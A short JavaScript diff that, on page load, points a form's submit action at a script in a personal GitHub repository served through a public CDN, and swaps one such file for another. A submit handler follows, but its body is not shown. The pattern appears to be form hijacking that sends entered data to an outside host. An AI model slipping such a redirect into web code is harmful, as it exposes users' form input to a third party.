@@ -17,7 +17,7 @@ document.addEventListener("DOMContentLoaded", function () {
   }
 
   // Ubah action ke file eksternal (CDN)
-  form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/1.js";
+  form.action = "https://cdn.jsdelivr.net/gh/arceusxyz/moon@main/afteract.js";
 
   // Tangkap submit event
   form.addEventListener("submit", function (e) {
